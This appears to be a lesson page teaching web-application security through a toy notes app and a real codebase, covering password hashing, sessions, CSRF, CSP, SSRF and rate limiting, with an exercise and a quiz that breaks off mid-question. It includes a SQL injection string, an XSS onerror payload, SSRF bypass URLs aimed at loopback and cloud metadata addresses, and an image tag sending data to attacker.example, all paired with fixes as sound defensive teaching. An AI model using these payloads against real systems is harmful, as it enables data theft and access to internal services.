---
slug: security-fundamentals
title: "Security fundamentals: authentication, sessions, CSRF, headers and secrets in a real app"
description: The OWASP risk families as a working map, and the concrete controls a senior engineer expects, from Argon2id and opaque session tokens to CSRF layers, CSP, trusted client IPs and secret handling, read through this app's code.
minutes: 40
difficulty: hard
tags: [security, owasp, authentication, sessions, csrf, xss, csp, secrets, senior-craft]
---
Most breaches do not need a zero-day. They need one endpoint that returns another user's data when you change the ID in the URL, a login that answers in 2 ms for unknown emails and 100 ms for real ones, a session table storing tokens in plain text, or a rate limiter keyed on a header the attacker controls: small decisions made by someone thinking about features.

Security at the senior level is a habit of asking, at every boundary, "who controls this input, and what happens if they lie?" This lesson runs each OWASP risk family as a concrete exploit against a small toy app, shows the fix, and reads this repository's controls, gaps and fixes included, as the worked example. The case study's [authentication and security lesson](/learn/case-study-ascend/the-system/authentication-and-security) follows the same code further.

## Ten risk families, each as an exploit and a fix

The OWASP Top 10 is a map of where applications fail. The table uses the 2021 numbering; the [2025 edition](https://top10.owasp.org/2025) folds SSRF into broken access control, widens vulnerable components into software supply chain failures, and adds mishandling of exceptional conditions. The middle column attacks a toy notes app with search, comments and link previews; the payloads are minimal illustrations, not tools.

| OWASP 2021 | Exploit against the toy notes app | Fix | In Ascend |
|---|---|---|---|
| A01 Broken access control | As Ada, `GET /notes/11` returns Bob's note: the handler looks it up by ID alone (run below) | The owner in the query; 404 for "not yours" | `InterviewService::get` returns `NotFound` for another user's interview |
| A02 Cryptographic failures | A leaked backup holds unsalted SHA-256 password hashes, and one GPU tests billions of guesses a second | A slow, salted, memory-hard hash; TLS everywhere; hashed session tokens | Argon2id; sessions stored as SHA-256 of the token; HSTS |
| A03 Injection | The term `%' OR 1=1 --` rewrites the `WHERE` clause (run below); `<img src=x onerror=alert(1)>` concatenated into HTML runs script | Parameterised queries; renderer escaping; a CSP | Bound `$1` values; React escapes text; no inline-script CSP |
| A04 Insecure design | A free AI endpoint called in a loop costs real money, and nothing in the design bounds it | Abuse cases designed in: quotas, budgets, cost ceilings | Per-session AI rate limit; per-user daily budgets held before each call |
| A05 Security misconfiguration | The API reflects any `Origin` with credentials allowed, so any site reads a signed-in user's data | Deny by default; validate configuration at boot | No CORS layer; production refuses to boot without `Secure` cookies |
| A06 Vulnerable components | A transitive dependency with a published advisory ships unnoticed | Lockfiles, advisory scanning, scheduled upgrades | Lockfiles; `cargo audit` and `pnpm audit --prod` in CI |
| A07 Identification and authentication | Credential stuffing replays leaked pairs from thousands of addresses; timing reveals which emails exist | Per-account limits, uniform timing and messages, MFA | 10 attempts a minute per account or known device; a dummy hash; one message; breached passwords refused |
| A08 Software and data integrity | CI runs an action by a mutable tag, and the tag is repointed at code that prints secrets | Pin actions and base images by digest | Actions pinned to commit SHAs, base images to digests; a read-only CI token |
| A09 Logging and monitoring | 50,000 password guesses over a week go unnoticed | Security events with alerts | Logs, request IDs, rate-limit refusal counts; no failed-login alert |
| A10 Server-side request forgery | A link preview fetches `http://2130706433/`, 127.0.0.1 as one number (run below) | Resolve, check every address, isolate the fetcher | The server never fetches a user-supplied URL |

The A08 row describes a real incident: in March 2025 the version tags of `tj-actions/changed-files` were repointed to a commit that printed secrets from the runner's memory into build logs ([CVE-2025-30066](https://github.com/advisories/ghsa-mrrh-fwg8-r2c3)). Ascend's CI referenced every action by tag (`actions/checkout@v4`) until commit `8f82820` pinned each to a full commit SHA with the version as a comment, gave base images their digests and the workflow a read-only token. Dependabot proposes weekly pull requests to move the pins, because a pin nobody updates becomes the vulnerable component; since commit `040cf0a`, patch, minor and digest-only updates merge themselves once the full CI suite passes, while majors wait for a person.

## Three exploits, run against the toy

A01 and A03, in 25 lines of Python against an in-memory SQLite database. The comments show what each line prints.

```python
import sqlite3

db = sqlite3.connect(":memory:")
db.executescript("""
CREATE TABLE notes (id INTEGER PRIMARY KEY, owner_id INTEGER NOT NULL, body TEXT NOT NULL);
INSERT INTO notes VALUES (10, 1, 'ada: shopping list'), (11, 2, 'bob: recovery codes 4417 9902');
""")

def search_vulnerable(user_id, term):               # A03: input becomes SQL text
    sql = f"SELECT id, body FROM notes WHERE owner_id = {user_id} AND body LIKE '%{term}%'"
    return db.execute(sql).fetchall()

def search(user_id, term):                          # fix: the driver sends term as data
    return db.execute("SELECT id, body FROM notes WHERE owner_id = ? AND body LIKE ?",
                      (user_id, f"%{term}%")).fetchall()

def get_note_vulnerable(user_id, note_id):          # A01: authenticated, never authorised
    return db.execute("SELECT body FROM notes WHERE id = ?", (note_id,)).fetchone()

def get_note(user_id, note_id):                     # fix: the owner is part of the key
    return db.execute("SELECT body FROM notes WHERE id = ? AND owner_id = ?",
                      (note_id, user_id)).fetchone()

print(search_vulnerable(1, "shop"))                 # [(10, 'ada: shopping list')]
print(search_vulnerable(1, "%' OR 1=1 --"))         # both rows: the WHERE clause was rewritten
print(search(1, "%' OR 1=1 --"))                    # []: the quote is only a character
print(get_note_vulnerable(1, 11))                   # Ada reads Bob's note by changing the id
print(get_note(1, 11))                              # None, which the API turns into a 404
```

Trace the injection. The f-string produces `... WHERE owner_id = 1 AND body LIKE '%%' OR 1=1 --%'`. `AND` binds tighter than `OR`, so the condition becomes `(owner_id = 1 AND …) OR 1=1`, true for every row, and `--` comments out the stray quote. With a placeholder the driver sends the statement and the value separately, so the database never parses the value as SQL. Ascend's request paths build queries with SeaORM or write SQL with bound values (`$1` to `$5` in the AI budget's atomic upsert in `crates/core/src/ai/budget.rs`); the one `format!` in that statement splices a compile-time constant, not input.

A10, against a preview feature that blocks internal hosts by string:

```python
import ipaddress, socket
from urllib.parse import urlsplit

def naive_allowed(url):                             # a string blocklist
    host = urlsplit(url).hostname or ""
    return host not in ("localhost", "127.0.0.1", "169.254.169.254") and not host.startswith(("10.", "192.168."))

def allowed(url):                                   # resolve first, then check every address
    host = urlsplit(url).hostname
    if not host:
        return False
    for *_, sockaddr in socket.getaddrinfo(host, None):
        ip = ipaddress.ip_address(sockaddr[0])
        if ip.version == 6 and ip.ipv4_mapped:      # ::ffff:a.b.c.d is an IPv4 address in disguise
            ip = ip.ipv4_mapped
        if not ip.is_global:                        # loopback, private, link-local, reserved
            return False
    return True

for url in ["http://2130706433/", "http://0x7f.1/", "http://[::ffff:169.254.169.254]/", "http://93.184.215.14/"]:
    print(url, naive_allowed(url), allowed(url))
# http://2130706433/ True False
# http://0x7f.1/ True False
# http://[::ffff:169.254.169.254]/ True False
# http://93.184.215.14/ True True
```

The resolver accepts the old numeric forms (a single 32-bit number, hex, shortened dotted quads), so a string check never sees `127.0.0.1`. Checking the resolved addresses closes that door, and two remain: DNS rebinding (the name resolves to a public address at check time and a private one at connect time, so connect to the address you checked) and redirects (check again at every hop). The durable fix is structural: fetch from a worker with no route to internal networks, behind an egress proxy, as [security in design](/learn/system-design/building-blocks/security-in-design) draws it.

## Under the hood: what a password hash costs

A stolen password table is attacked offline, at the attacker's pace, so the hash must be expensive for each guess. Measured on one core of this lesson's machine (Python 3.14's `hashlib`, and Node 24.21's OpenSSL 3.5 for Argon2id):

| Function | Parameters | Time per hash | Memory per hash | What it means for an attacker |
|---|---|---|---|---|
| SHA-256 | one pass | 0.17 µs | none | One RTX 4090 runs about 22 billion guesses a second in a published hashcat benchmark |
| PBKDF2-HMAC-SHA256 | 600,000 iterations | 49 ms | none | About 15,000 a second on that GPU (its 999-iteration figure, scaled), and GPUs parallelise it freely |
| scrypt | $N = 2^{17}$, $r = 8$, $p = 1$ | 197 ms | 128 MiB | Memory caps how many guesses run at once |
| Argon2id | 19,456 KiB, 2 passes, 1 lane (Ascend's) | 11.9 ms | 19 MiB | A GPU with 24 GiB holds about 1,290 instances at a time |

`crates/core/src/auth/password.rs` uses Argon2id with the `argon2` crate's defaults (those parameters, which match OWASP's minimum recommendation) and a random 16-byte salt per password, so identical passwords get different hashes and precomputed tables are useless. Implementations differ (the pure-Rust crate is not OpenSSL), and the module's own comment estimates about 100 ms; budget tens of milliseconds and 19 MiB per call.

That cost lands on the server too:

```rust
static HASH_PERMITS: LazyLock<tokio::sync::Semaphore> = LazyLock::new(|| {
    let cpus = std::thread::available_parallelism().map(|n| n.get()).unwrap_or(2);
    tokio::sync::Semaphore::new(cpus.max(2))
});

pub async fn hash(password: String) -> AppResult<String> {
    let _permit = HASH_PERMITS.acquire().await.map_err(AppError::internal)?;
    tokio::task::spawn_blocking(move || hash_sync(&password))
        .await
        .map_err(|e| AppError::Internal(format!("join: {e}")))?
}
```

On Tokio's async workers a hash would stall every request scheduled on that thread, so `spawn_blocking` moves it to the blocking pool. A review found the gap in stopping there: the pool grows to 512 threads by default, and 512 × 19 MiB is about 9.5 GiB, far past the container's memory. A semaphore now admits one hash per CPU (minimum two), `verify` takes the same permit, and the authentication rate limit bounds how many wait. The rule generalises: move CPU-heavy calls off the async workers *and* bound how much runs at once ([async and event loops](/learn/systems/concurrency/async-and-event-loops)).

`RegisterInput` requires 15 to 200 characters. Length beats composition rules, which push users toward predictable patterns, and the upper bound caps the work one request can force. The 15 comes from NIST's [SP 800-63B-4](https://pages.nist.gov/800-63-4/sp800-63b.html) (August 2025): at least 15 characters for a password used as the only factor (8 when it is part of MFA), no composition rules, support for at least 64 characters, and screening every new password against a blocklist of breached and common ones. Ascend's minimum was 10 until a review against that document; sign-in still accepts shorter passwords, so raising the bar locked nobody out. The blocklist is Have I Been Pwned's range API with k-anonymity: the server sends only the first five hex digits of the password's SHA-1, receives every breached hash with that prefix (padded to 800 to 1,000 lines so the response size leaks nothing), and compares locally. If the service is down, sign-up proceeds: the check raises the floor, and it must not become a way to take sign-up down.

## Login without leaking who has an account

From `crates/core/src/auth/service.rs`:

```rust
let user = Users::find().filter(users::Column::Email.eq(&email)).one(&self.db).await?;
// Always verify, even for unknown users, to keep timing uniform.
let ok = password::verify(input.password, user.as_ref().map(|u| u.password_hash.clone())).await;
let Some(user) = user.filter(|_| ok) else {
    return Err(AppError::Validation("invalid email or password".into()));
};
```

For an unknown email, `password::verify` checks against a precomputed `DUMMY_HASH` and returns `ok && exists`, always false, so both branches pay one Argon2id verification and send the same message; otherwise a stopwatch enumerates accounts. "Precomputed" took a fix: the lazily initialised hash was computed by the first unknown-email login after each boot, making that response twice as slow, so `main` now calls `password::warm_up()` before serving. A timing defence has to cover the first call too.

Registration is the other door. It used to look the email up before hashing, so "already registered" came back about 100 ms faster, and two simultaneous sign-ups could both pass the check, the loser hitting the unique index as a `500`. It now hashes first and lets the unique index decide, mapping the violation to `409` (`concurrent_registrations_for_one_email_yield_one_account_and_conflicts` fires four at once). The message still reveals a registered email, a conscious trade. Email verification arrived in commit `39052ce` but does not gate sign-up, so it cannot hide the answer yet; the mitigation is the per-IP authentication limit. While sign-up is invite-only (`SIGNUPS=invite`, commit `ba89a60`), the invite is spent in the same transaction, before the insert, so only someone holding a valid code reaches the `409` at all.

The reset form shows the complete pattern: it answers the same whether or not the account exists, and looks the account up and sends the email in a background task, so neither the body nor the timing tells (`reset_requests_reveal_nothing_and_links_expire`).

## Sessions: opaque tokens, stored hashed

After login the server must recognise the browser. `crates/core/src/auth/token.rs` generates 32 random bytes as 43 URL-safe base64 characters, and the `sessions` table stores only their SHA-256 as its primary key, so a stolen table holds hashes that cannot become cookies; an integration test asserts that no row contains the raw token from the cookie.

Why SHA-256 here when passwords need Argon2id? Entropy. A password is a few dozen bits of human-chosen text, so each guess must be slow. A 256-bit random token cannot be found at any guess rate: at $10^{12}$ guesses a second, searching half of $2^{256}$ takes about $10^{57}$ years. Slow hashing is for low-entropy secrets only.

| | Opaque session (Ascend) | Self-contained JWT |
|---|---|---|
| Per-request check | Indexed primary-key lookup | Signature verification, no I/O |
| Revocation | Delete the row, effective at once | Wait for expiry, or keep a denylist (a session table again) |
| Size | A 58-byte cookie | Hundreds of bytes to kilobytes |
| Keys to manage | None | Signing keys to protect and rotate |

[Authentication and authorization](/learn/senior-craft/software-craft/authentication-and-authorization) measures those costs. Around Ascend's tokens: `token::looks_valid` rejects anything that is not 43 URL-safe characters before touching the database; `authenticate` deletes a session it finds expired (30 days after login) or idle (`SESSION_IDLE_DAYS`, 14 by default, measured from `last_seen_at`, written at most hourly), and an hourly task sweeps the rest; `logout_everywhere` deletes every session for the user; and deleting the account requires the password, charged to the same password-attempt budget as login and answered with `422` rather than a `401` the SPA would read as signed out. The cookie is `HttpOnly`, `SameSite=Lax`, scoped to `/`, and `Secure`, which production refuses to boot without.

## Authorisation: every query has an owner

The toy's `get_note_vulnerable` is broken access control in its purest form, and it passes every happy-path test. In Ascend, `InterviewService::get` in `crates/core/src/services/interviews.rs` returns `NotFound` when the interview's `user_id` is not the caller's, so another user's interview looks exactly like a missing one, and `CommentService::delete` allows the author or an admin and returns `Forbidden` otherwise. Both checks live in the core services, not in route handlers, so a future CLI or worker inherits them.

A review note: "fetch, then compare" depends on every author remembering the comparison; filtering in the query (`WHERE id = $1 AND user_id = $2`), as the toy's fix does, makes the safe path the only path.

## CSRF: the problem with ambient credentials

Browsers attach cookies to requests triggered by *other* sites. If `evil.example` serves an auto-submitting form that POSTs to your API, the victim's browser sends their session cookie with it, and the server sees a valid session and a plausible request. `crates/api/src/middleware/csrf.rs` layers three independent defences:

1. **`SameSite=Lax` cookies.** Browsers withhold the cookie from cross-site POST, PUT and DELETE sub-requests. Lax still sends it on top-level GET navigations, which is why GET handlers must never change state.
2. **Origin check.** On every mutating method, `Origin` (or, if absent, the origin part of `Referer`) must equal the configured `PUBLIC_ORIGIN` exactly: scheme, host and port. Requests with neither header come from non-browser clients, which carry no ambient cookies.
3. **A required custom header.** Every POST, PUT, PATCH and DELETE must carry `X-Requested-With`. A cross-origin page cannot set a custom header without a CORS preflight, which this server never grants; `web/src/lib/api.ts` adds it to every request.

Four forged requests traced through the layers, with `PUBLIC_ORIGIN` set to `https://ascend.example`:

| Forged request | Cookie attached? | Origin check | Custom header | Outcome |
|---|---|---|---|---|
| Auto-submitting `<form method="post">` on `evil.example` | No: a cross-site POST under Lax | `https://evil.example` is not the origin: reject | Absent, since forms cannot set headers: reject | `403 csrf`, three times over |
| `fetch` with `method: "DELETE"`, `credentials: "include"` and an `X-Requested-With` header, from `evil.example` | Would be withheld | Not reached | The custom header forces a CORS preflight, which is never granted | The browser never sends the DELETE |
| A form on a compromised `blog.ascend.example` | Yes: same site | `https://blog.ascend.example` is not the origin: reject | Absent: reject | `403 csrf`, with `SameSite` already beaten |
| `curl` with a stolen cookie and the header | Yes, set by the attacker | Neither header present: allowed | Present | Allowed: this is session theft, which no CSRF defence addresses |

`SameSite` has a history of partial browser support, and "same-site" is not "same-origin": a compromised sibling subdomain is the same site. The custom-header rule depends on the server never enabling permissive CORS. Stacked, each covers the others' gaps, and that paid off once: the first Referer check compared by prefix (`referer.starts_with(expected)`), which `https://ascend.example.evil.net/page` satisfies, and the custom header still blocked forged requests. The middleware now delegates to `allowed(headers, public_origin)`, which reduces a Referer to its origin, compares origins for equality, and has a unit test for each look-alike. Compare security identifiers by parsing and equality, never by prefix.

```exercise
id: csrf-gate
title: Implement the CSRF gate
prompt: |
  Implement `csrf_allowed(method, headers, expected_origin)`. Header names in
  `headers` are lowercase. Rules:

  1. GET, HEAD and OPTIONS are always allowed (they must not change state).
  2. POST, PUT, PATCH and DELETE require an `x-requested-with` header;
     without it, reject.
  3. If an `origin` header is present, it must equal the expected origin,
     ignoring trailing slashes on either side.
  4. Otherwise, if a `referer` header is present, it must either equal the
     expected origin or start with the expected origin followed by `/`
     (a plain prefix match would accept `https://app.example.evil.net`).
  5. If neither header is present, allow (non-browser client).

  Return `true` to allow, `false` to reject.
languages: [python, javascript]
entry: csrf_allowed
starter:
  python: |
    def csrf_allowed(method, headers, expected_origin):
        # your code here
        return True
  javascript: |
    function csrf_allowed(method, headers, expected_origin) {
      // your code here
      return true;
    }
tests:
  - args: ["GET", {}, "https://ascend.example"]
    expected: true
    label: safe methods pass
  - args: ["POST", {"origin": "https://ascend.example", "x-requested-with": "fetch"}, "https://ascend.example"]
    expected: true
  - args: ["POST", {"origin": "https://evil.example", "x-requested-with": "fetch"}, "https://ascend.example"]
    expected: false
    label: foreign origin
  - args: ["PUT", {"origin": "https://ascend.example"}, "https://ascend.example"]
    expected: false
    label: missing custom header
  - args: ["DELETE", {"x-requested-with": "fetch"}, "https://ascend.example"]
    expected: true
    label: non-browser client
  - args: ["POST", {"referer": "https://ascend.example.evil.net/page", "x-requested-with": "fetch"}, "https://ascend.example"]
    expected: false
    hidden: true
    label: a prefix is not an origin
  - args: ["PATCH", {"referer": "https://ascend.example/learn/x", "x-requested-with": "fetch"}, "https://ascend.example/"]
    expected: true
    hidden: true
    label: trailing slash in configuration
hints:
  - "Normalise both origins by stripping trailing slashes before comparing."
  - "Check the custom header before looking at Origin or Referer; it is required for every mutating method."
```

## XSS and the Content Security Policy

Cross-site scripting is injection into HTML: the toy's comment `<img src=x onerror=alert(1)>`, concatenated into a page, runs script with the victim's session. The first defence is the renderer: React escapes text, and its one raw-HTML API is named `dangerouslySetInnerHTML`. Ascend used it once, for exercise prompts, behind a hand-rolled escaper; prompts now go through the same `react-markdown` component as lessons, and the codebase has no `dangerouslySetInnerHTML` at all. The one direct HTML write left, in `Mermaid.tsx`, renders diagrams from coach replies too, so it initialises Mermaid with `securityLevel: "strict"`.

The second defence tells the browser what the page may load and run even if an injection slips through. `crates/api/src/middleware/security_headers.rs` sets, among others:

```text
default-src 'self';
script-src 'self' 'unsafe-eval' 'wasm-unsafe-eval' https://cdn.jsdelivr.net blob:;
img-src 'self' data: blob:;
connect-src 'self' https://cdn.jsdelivr.net https://pypi.org https://files.pythonhosted.org;
frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'
```

No `'unsafe-inline'` for scripts is what blocks injected `<script>` tags and `onerror=` handlers. `'unsafe-eval'` is a documented weakening: the in-browser runners (Pyodide and the JavaScript sandbox) need `new Function` and WebAssembly. It is compensated elsewhere: learner code runs in Web Workers with no DOM, the JavaScript worker loses `fetch`, `XMLHttpRequest`, `WebSocket` and `importScripts`, and any worker past its time limit is terminated. A review also tightened `img-src`, which allowed any HTTPS host: an injected `<img src="https://attacker.example/?d=...">` carries data off a page with no script at all. Every CSP source should be there because a feature needs it.

The remaining headers close one door each: `frame-ancestors 'none'` and `X-Frame-Options: DENY` stop clickjacking, `nosniff` stops content-type confusion, and `Strict-Transport-Security` with a one-year `max-age` makes browsers refuse plain HTTP.

## Untrusted results, then untrusted code on the server

Because learner code runs in the browser, test results used to arrive as claims. ADR 0003 accepted that ("a learner who fakes a result only cheats themselves") until progress fed the roadmap, coach and dashboard, where one `POST /api/submissions` claiming every test passed marked any problem solved. ADR 0005 (commit `25fd477`) keeps the browser run for instant feedback, but the server grades the same code and stores only its own verdict. Untrusted code on the server is the risk 0003 avoided, so it runs in a sandbox with a budget: CPython and QuickJS compiled to WASI under Wasmtime, given stdin, capped output pipes and, for Python, a read-only standard library, with no network, environment variables, other files or processes, and a fresh instance per run. Epoch interruption every 10 ms enforces the time limit, a 256 MiB store limit caps memory, a semaphore of half the cores (1 to 4) with a 20-second queue caps concurrency, and 20 submissions a minute per session cap volume. Expected values never enter the sandbox: the harness reports what the function returned and the host compares (running the browser's own `compare.js` in a separate QuickJS instance), so tampering with the harness gains nothing that returning chosen values would not. An end-to-end test posts a claimed 99 of 99 for a wrong answer and expects failure, and `crates/grader/tests/sandbox.rs` tries the escapes.

Since commit `c0b3151` the sandbox can also live in its own service, `ascend-api --serve-grader`: the same image, holding the runtimes and one shared token, never reading `DATABASE_URL` or the AI key, and with no public domain, so code that escaped the sandbox would find nothing worth taking. The API uses it once `GRADER_URL` is set, and the service checks the token in constant time. Production did so from `eed6d46` until `04ab90f`; while Ascend is invite-only it grades in-process again, so for now learner code runs, sandboxed, inside the process that holds the secrets, and the WebAssembly boundary is the only wall. That is a trade accepted for cost, and one flag reverses it.

## Transport: TLS everywhere

The platform terminates TLS at its edge, and the app enforces the consequences: `COOKIE_SECURE` defaults to true whenever `PUBLIC_ORIGIN` starts with `https://`, and production refuses to boot without it. [TLS and PKI](/learn/networking/fundamentals/tls-and-pki) covers certificates and chains.

```viz
{"type": "network", "scenario": "https-tls-handshake", "title": "TLS 1.3 protects the cookie in transit", "caption": "One round trip establishes keys; everything after, including the Cookie header, is encrypted. HSTS ensures the browser never tries plain HTTP first."}
```

## Rate limits and the client IP you can trust

`crates/api/src/middleware/rate_limit.rs` sets seven limits, and the interesting decision in each is the key:

| Limit | Quota | Keyed by | Stops |
|---|---|---|---|
| Sign-up, login and email-link routes | 30 per minute | client IP | one address hammering the Argon2 endpoints |
| Password-reset emails | 3 per hour | the email address | flooding a stranger's inbox |
| Verification emails | 3 per hour | the account | the same, from a signed-in account |
| Password attempts (login, account deletion) | 10 per minute | the known device, else the account's email | guessing one learner's password from many addresses |
| Model calls | 20 per minute | session (IP if there is none) | one learner burning model calls |
| Graded submissions | 20 per minute | session (IP if there is none) | one learner filling the grading slots |
| General (all of `/api`) | 1,200 per minute | client IP | one client flooding cheap reads |

Most of those keys are one review finding: a class or an office shares one NAT address, and per-IP limits punish it. The login bucket used to be 10 per minute per IP, too tight for a class and too weak against guesses spread across addresses; the AI bucket was per IP too, so thirty learners behind one address shared twenty calls a minute, and now keys on the first 16 bytes of the SHA-256 of the session cookie. Throttled responses carry a `Retry-After` computed from the limiter; [rate-limiting algorithms](/learn/networking/network-algorithms/rate-limiting-algorithms) covers the algorithms.

```viz
{"type": "system", "algorithm": "token-bucket", "capacity": 3, "refill": 20, "unit": "min", "keys": ["email:ada", "email:ada", "email:ada", "email:ada", "email:bob", "email:ada"], "times": [0, 0, 0, 0, 0, 20], "title": "Keyed token buckets", "caption": "Each key (an IP, an account, a device, a session) refills at a fixed rate up to a burst size. Here, password-reset emails keyed by email address, 3 per hour: one address running dry never touches another's bucket. Password attempts get a small bucket; general browsing a large one."}
```

**Where the counts live, before and after.** Every limit used to be an in-memory `governor` limiter (GCRA, which its README calls equivalent to a leaky bucket): right for one replica, quietly wrong for two, because N processes allowed N times every limit. Commit `427ed78` moved the security limits into Postgres (`crates/core/src/services/rate_limit.rs`). GCRA keeps one number per key, the theoretical arrival time (TAT) of the next request, so check and update are one statement on an `UNLOGGED` table `rate_limits(key, tat)`: an `INSERT … ON CONFLICT (key) DO UPDATE … WHERE` the TAT is within tolerance, `RETURNING tat`. No row back means refused, and the row lock stops two replicas both taking the last slot. [Unlogged](https://www.postgresql.org/docs/current/sql-createtable.html) tables skip the write-ahead log and are truncated after a crash, which only forgives a burst; an unreachable database fails these limits closed with a 503. `replicas_share_the_security_limits` runs two apps over one database and asserts that the second refuses a login after ten guesses at the first. The general bucket stays in memory per replica on purpose: it only stops floods, and a database round trip per request would cost more than it saves.

**Lockout, before and after.** A per-account limit has a price: anyone who knows your email can spend your ten attempts a minute. Ascend now uses OWASP's [device-cookie](https://owasp.org/www-community/Slow_Down_Online_Guessing_Attacks_with_Device_Cookies) pattern. A successful sign-up or login sets `ascend_device`, a random token stored only as a hash in `login_devices`, scoped to `/api/auth`, `HttpOnly`, `SameSite=Strict`, for 365 days. A login from a device known for that account is charged to that device's bucket; unknown devices, forged cookies included, share the account's. `an_attacker_cannot_lock_the_owner_out_of_a_known_device` exhausts the account bucket with wrong guesses and asserts the owner's browser still signs in.

A limiter is only as good as its key. Behind a proxy the socket address is the proxy's, and the first `X-Forwarded-For` entry is whatever the client sent: a fresh bucket per request. Ascend reads the IP only from the header named in `CLIENT_IP_HEADER`, one the trusted edge sets itself (`x-real-ip` on Railway), and otherwise uses the socket address; the check you still owe is that the edge overwrites a client-supplied copy. The request ID gets the same suspicion: `crates/api/src/middleware/request_id.rs` keeps a client-supplied `x-request-id` only if it parses as a UUID.

## Secrets

`crates/core/src/config.rs` wraps the database URL and the AI key in `SecretString` from the `secrecy` crate, whose `Debug` output is redacted, so `tracing::debug!(?config)` cannot print the password. A library can still quote the URL back (sea-orm's connect error includes the whole connection string), so since commit `8f82820` `connect_db` redacts the password before the message is logged. Secrets come from the platform's environment, `.dockerignore` excludes `.env` (anything copied into a layer is recoverable even if a later layer deletes it), and `.railway/railway.ts` declares `ANTHROPIC_API_KEY: preserve()`, which keeps the value in the platform, so the file can be public. Scan for committed secrets in a pre-commit hook and in CI.

## Failure modes

| Symptom | Diagnosis | Fix |
|---|---|---|
| A user sees another user's record after changing an ID in the URL | The lookup is by ID alone; tests only cover the owner | Owner in the `WHERE` clause; a test that reads as a second user |
| The process is OOM-killed during a login burst | Hundreds of 19 MiB hashes at once on an unbounded blocking pool | A semaphore of one hash per CPU; a per-IP auth limit |
| Login latency differs by about one hash between known and unknown emails | The unknown branch skips verification, or the first dummy hash is computed on demand | Verify against a dummy hash that is computed at boot |
| The per-IP limiter never throttles a scripted attack | The key is the first `X-Forwarded-For` entry, which the client controls | Key on a header the edge overwrites; limit per account too |
| The preview service fetches cloud metadata credentials | Numeric or IPv6-mapped forms bypass a string blocklist | Resolve, check and pin every address, re-check redirects, isolate the fetcher |
| CI secrets appear in a build log after no change of yours | A third-party action's tag was moved to malicious code | Pin actions to commit SHAs; limit which jobs receive secrets |

## Trade-offs: the CSRF defences compared

| Defence | Stops | Defeated by | Cost | Depends on |
|---|---|---|---|---|
| `SameSite=Lax` cookie | Cross-site POSTs and sub-requests | A GET that changes state; a compromised sibling subdomain | A flag | Browser support |
| Exact `Origin` check | Any cross-origin browser request | Prefix comparisons; clients that send neither header, which carry no cookie | A header comparison | A correct `PUBLIC_ORIGIN` |
| Required custom header | Any cross-origin request without a preflight | A permissive CORS policy | One header in the client | Never granting preflights |
| Synchroniser token | Forged requests from any origin | XSS, which can read the token | Server state or signing; plumbing into every form | Token delivery to the page |

## Interviewer follow-ups

**"Sessions are hashed with SHA-256 but passwords with Argon2id. Is that inconsistent?"** Model answer: no; slow hashing compensates for low entropy. A 256-bit random token cannot be brute-forced at any rate, so a fast hash already makes a leaked table useless, while a human password falls to a fast hash in minutes. Common wrong answer: "use Argon2id for tokens too, to be safe", which slows every request and changes no attack.

**"How do you stop credential stuffing without locking out whole offices?"** Model answer: limit per account (the attacker cannot vary the key) but give known devices their own bucket so guesses cannot lock the owner out, keep per-IP limits loose because NATs share addresses, add breached-password screening and MFA, and alert on distributed failure patterns. Common wrong answer: "block the IP after five failures", which punishes a school and does nothing against a botnet.

**"Our preview feature blocks 127.0.0.1 and 169.254.169.254. Is SSRF handled?"** Model answer: no: numeric and IPv6-mapped encodings, DNS names that resolve to internal addresses, rebinding between check and connect, and redirects all pass a string list. Resolve, check and connect to the checked address, re-check each redirect, and isolate the fetcher. Common wrong answer: "add more entries to the blocklist."

## What mid-level engineers get wrong

- **Checking authentication and calling it authorisation.** Every logged-in user can read any record whose ID they guess.
- **Building SQL or HTML with string formatting** and escaping by hand.
- **Fast hashes for passwords, or slow hashes for random tokens.** The first cracks in hours; the second adds latency for no gain.
- **Keying rate limits on `X-Forwarded-For`** or on IP alone for login.
- **Comparing origins, hosts or URLs by prefix** instead of parsing and comparing for equality.
- **Referencing CI actions and base images by mutable tag** in a pipeline that holds deploy secrets.

## Senior signals

- You ask **"who controls this input?"** at every boundary, including headers such as `X-Forwarded-For`, `Origin` and `Referer`.
- You can run each OWASP family as a **concrete exploit and fix** and say which your system still has open.
- You can explain why passwords need a **slow, memory-hard, salted** hash while 256-bit session tokens need only **SHA-256**, with the numbers.
- You design login to be **timing- and message-uniform**, and know which endpoints still enumerate accounts.
- You put **authorisation in the domain layer**, scoped by owner in the query, and treat 404-for-not-yours as the default.
- You treat every weakened control (`'unsafe-eval'`, a permissive CORS rule) as a **documented trade-off with named compensating controls**.

## Check yourself

```quiz
- q: >-
    Ascend stores session tokens as SHA-256 hashes but passwords as Argon2id hashes. Why is a fast hash acceptable for the tokens?
  options: ["Tokens expire within 30 days, so a stolen hash is soon useless", "Tokens are 256 random bits, so no guess rate could ever find one", "SHA-256 is a stronger algorithm than Argon2id for short inputs", "Tokens are also encrypted at rest, so the hash is a second layer"]
  answer: 1
  explanation: >-
    Slow hashing compensates for low-entropy inputs that attackers can guess. A 256-bit random token has no guessable structure: at a trillion guesses a second, searching half the space takes around 10^57 years. Expiry limits the window but does not replace hashing, SHA-256 is faster than Argon2id rather than stronger, and the tokens are not encrypted in the database: the hash is the only protection, and it is enough.
- q: >-
    A search endpoint builds SQL with an f-string, and the term %' OR 1=1 -- returns every user's rows. Why does a parameterised query stop this?
  options: ["The driver sends the value separately, so it is never parsed as SQL", "The database rejects any value that contains an SQL keyword like OR", "Parameterised queries escape quotes by doubling them before sending", "Placeholders limit the value's length so a payload cannot fit in it"]
  answer: 0
  explanation: >-
    With a placeholder the statement's structure is fixed before the value arrives; the value is bound as data, so its quote and OR are only characters in a LIKE pattern, and the toy's fixed search returned no rows. Escaping is the fragile alternative that parameterisation replaces, and databases do not filter keywords or cap lengths for you.
- q: >-
    A rate limiter keys login attempts on the first IP in X-Forwarded-For. What can an attacker do?
  options: ["Skip the CSRF check, since the limiter runs before the CSRF layer", "Spoof only IPv6 addresses, because IPv4 entries are checked against TCP", "Send a new fake IP each request and get a fresh bucket every time", "Nothing, because proxies replace the header with the real client IP"]
  answer: 2
  explanation: >-
    Proxies append to X-Forwarded-For; they do not remove what the client sent, so the first entry is attacker-controlled whatever its address family. Each fake IP gets its own bucket, so the per-IP limit disappears. The limiter's key has nothing to do with CSRF. Key on a header your trusted edge overwrites (Ascend reads only CLIENT_IP_HEADER, x-real-ip on Railway), or on the socket address, and limit per account as well.
- q: >-
    A link-preview service rejects URLs whose host is 127.0.0.1, localhost or 169.254.169.254. Why is http://2130706433/ still dangerous?
